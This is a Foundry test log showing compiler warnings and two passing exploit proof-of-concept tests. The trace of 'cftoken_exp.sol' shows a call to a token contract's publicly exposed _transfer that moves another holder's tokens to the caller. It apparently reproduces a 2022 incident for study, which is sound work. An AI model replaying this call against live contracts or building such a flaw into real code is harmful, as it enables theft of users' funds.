Compiling 26 files with Solc 0.8.25
Compiling 25 files with Solc 0.8.10
Solc 0.8.10 finished in 778.62ms
Solc 0.8.25 finished in 916.84ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 255.26ms (106.59µs CPU time)

Ran 1 test for src/test/2022-04/cftoken_exp.sol:ContractTest
[PASS] testExploit() (gas: 86599)
Logs:
  Before exploit, cftoken balance:: 0
  After exploit, cftoken balance:: 930000000000000000000

Traces:
  [86599] ContractTest::testExploit()
    ├─ [2535] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Before exploit, cftoken balance:", val: 0)
    ├─ [71497] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196::_transfer(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, value: 14000000000000000000 [1.4e19])
    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: 0xa9056272Ca777a63ae3A275d7aab078fd90A1691, value: 21000000000000000000 [2.1e19])
    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: 0x3eCfFcCc4C35CCd71A7c61446c90117fb7995fB1, value: 35000000000000000000 [3.5e19])
    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 930000000000000000000 [9.3e20])
    │   └─ ← [Stop] 
    ├─ [535] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   └─ ← [Return] 930000000000000000000 [9.3e20]
    ├─ emit log_named_uint(key: "After exploit, cftoken balance:", val: 930000000000000000000 [9.3e20])
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 372.53ms (645.29µs CPU time)

Ran 2 test suites in 373.42ms (627.79ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
